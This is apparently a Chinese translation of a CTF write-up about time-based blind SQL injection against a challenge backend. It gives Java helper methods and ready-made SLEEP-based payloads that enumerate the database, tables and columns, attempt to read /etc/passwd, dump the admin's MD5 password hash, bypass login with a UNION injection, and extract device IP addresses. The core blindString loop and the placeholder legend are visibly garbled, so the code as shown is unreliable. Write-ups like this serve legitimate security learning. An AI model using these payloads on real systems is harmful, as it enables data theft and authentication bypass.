为了测量响应时间，我们需要获得调用`sendCommand`之前的时间和调用之后的时间，然后把2者相减，再与`TIME_TO_WAIT`相比较，如果所用的时间大于`TIME_TO_WAIT`则为True否则为False。  
现在我们需要一个通用的查询模板，它允许我们从数据库中提取数据：
    '||(IF((SELECT ascii(substr(column,{1},1)) from table limit {2},1){3}{4},SLEEP({5}),1))#
以及：
    {1} -> %d -> 截取第几个字符
    {2} -> 行偏移
    {3} -> %c -> 比较操作符 ( =, >,  %d -> ascii码
    {5} -> %d -> 睡眠时间
为了提高性能，我们可以使用二分查找法进行基于时间的布尔检查：
    public static String blindString(String injection, int len) throws Exception {  
            StringBuilder value = new StringBuilder("");
            for(int c = 1; c ', ort, PayloadRequest.TIME_TO_WAIT );
                if( PayloadRequest.blindBoolean(payload) ) {
                    low = ort;
                    } else {
                    high = ort;
                }
                }
            }
            return value.toString();
        }
所有准备看上去都很好那么开始泄漏一些数据：
### Database recon
#### version()
    public static String blindVersion() throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(version(),%d,1)))%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 25);
        }
        // 10.1.37-MariaDB
#### database()
    public static String blindDatabase() throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(database(),%d,1)))%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 25);
        }
        // flitebackend
#### hostname + datadir
    System.out.println(blindString("'||(IF((SELECT ascii(substr(@@hostname,%d,1)))%c%d,SLEEP(%d),1))#", 20)); 
        // hostname: de8c6c400a9f
        System.out.println(blindString("'||(IF((SELECT ascii(substr(@@datadir,%d,1)))%c%d,SLEEP(%d),1))#", 30));
        // datadir: /var/lib/mysql/
#### Tables
    public static String blindTableName(int offset) throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=database() limit "+offset+",1)%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 100);
        }
        ...
        PayloadRequest.blindTableName(0); // devices
        PayloadRequest.blindTableName(1); // users
        PayloadRequest.blindTableName(2); // None
在`flitebackend`数据库中找到2张表：`devices`和`users`
#### Read files?
也许我们可以读取一些文件？
    System.out.println(blindString("'||(IF((SELECT ascii(substr(load_file('/etc/hosts'),%d,1)))%c%d,SLEEP(%d),1))#", 20));
        System.out.println(blindString("'||(IF((SELECT ascii(substr(load_file('/etc/passwd'),%d,1)))%c%d,SLEEP(%d),1))#", 20));
我认为不行。
#### Login
也许你想知道为什么我还没有登录。因为我尝试登录前正在做基于时间的SQL盲注。所以让我们看看我们是否能够使用SQL注入登录：
    System.out.println(PayloadRequest.sendCommand("' or 1=1#", "123123", "getTemp")); 
        // {"success": false, "error": "Invalid username or password"}
嗯，我们需要考虑后端如何进行登录处理：
    1.SELECT username, password FROM users WHERE username='+ username_param +' and password = '+ password_param +' ?
    2.SELECT password FROM table WHERE username='+ username_param +'; then check password?
对于1来说我们已经知道不是这种情况，因为使用`'or 1=1＃`会给我们一个成功的消息。对于2来说我们需要另一个测试，首先，让我们检查一次查询有多少列。
    System.out.println(PayloadRequest.sendCommand("' order by 1#", "", "getTemp")); 
        // {"success": false, "error": "Invalid username or password"}.
        System.out.println(PayloadRequest.sendCommand("' order by 2#", "", "getTemp")); 
        // {"success": false, "error": "Unknown"}
好的，基于错误消息，我们可以确认查询中只有一列。因此，我们可以尝试使用UNION伪造成功的查询：
    System.out.println(PayloadRequest.sendCommand("' union all select ''#", "", "getTemp")); 
        // {"success": false, "error": "Invalid username or password"}
还是不行，看样子有一些其他的东西，退一步，让我们dump所有的用户表。
#### users table
首先，我们需要知道表结构。为了方便这个过程，我创建了一个名为blindColumnName的方法，它有两个参数：table和offset。这个方法会dump所有来自`table`指定的表的所有列名。
    public static String blindColumnName(String table, int offset) throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(column_name,%d,1)) from information_schema.columns where table_name='"+table+"' and table_schema = database() limit "+offset+",1)%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 100);
        }
        ...
        PayloadRequest.blindColumnName("users",0); // id
        PayloadRequest.blindColumnName("users",1); // username
        PayloadRequest.blindColumnName("users",2); // password
        PayloadRequest.blindColumnName("users",3); // None
表结构`users(id, username, password)`
#### devices table
和上面的处理相同适用于`devices`表。
    PayloadRequest.blindColumnName("devices",0); // id
        PayloadRequest.blindColumnName("devices",1); // ip
        PayloadRequest.blindColumnName("devices",2); // None
表结构`devices(id, ip)`
#### Dumping
知道了表结构，我们可以dump值：
    public static String blindUsername(int offset) throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(username,%d,1)) from users limit "+offset+",1)%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 5);
        }
        PayloadRequest.blindUsername(0); // admin
        PayloadRequest.blindUsername(1); // None
        public static String blindColumnUsersValues(String column, int length) throws Exception {
            String injection = "'||(IF((SELECT ascii(substr("+column+",%d,1)) from users where username = 'admin')%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, length);
        }
        public static String blindPassword() throws Exception {
            return PayloadRequest.blindColumnUsersValues("password", 32);
        }
        PayloadRequest.blindPassword(); // 5f4dcc3b5aa765d61d8327deb882cf99
只有一个用户（“admin”，“5f4dcc3b5aa765d61d8327deb882cf99”）。这是哈希吗？用Google搜索它并找到答案，是的：`md5('password')`。现在我们可以使用admin：password或甚至使用sqli登录：
    System.out.println(PayloadRequest.sendCommand("admin", "password", "getTemp"));
        // {"temperature": 73, "success": true}
        System.out.println(PayloadRequest.sendCommand("' union all select '47bce5c74f589f4867dbd57e9ca9f808'#", "aaa", "getTemp"));
        // {"temperature": 73, "success": true}
是时候dump表`devices`的数据了。
    public static String blindIpDevices(int offset) throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(ip,%d,1)) from devices limit "+offset+",1)%c%d,SLEEP(%d),1))#";
            return PayloadRequest.blindString(injection, 16); // Fixed length
        }
        ...
        PayloadRequest.blindIpDevices(0);
        // Device: 0    192.88.99.253
        PayloadRequest.blindIpDevices(1);
        // Device: 1    192.88.99.252
        PayloadRequest.blindIpDevices(2);
        // Device: 2    10.90.120.23
在获得几个ips后，我注意到大多数都属于私有IP地址。我的第一个想法是构建一个移除所有私有IP地址的查询（参见where子句）：
    public static String blindDeviceQuery() throws Exception {
            String injection = "'||(IF((SELECT ascii(substr(ip,%d,1)) from devices where substr(ip,1,2) not in ('24', '25') and substr(ip,1,3) not in ('192', '10.', '198') limit 0,1)%c%d,SLEEP(%d),1))#"; 
            return PayloadRequest.blindString(injection, 16);
        }
        PayloadRequest.blindDeviceQuery();
        // 104.196.12.98
太好了！一个真实的IP地址。  
[原文链接](https://github.com/manoelt/50M_CTF_Writeup#login "原文链接")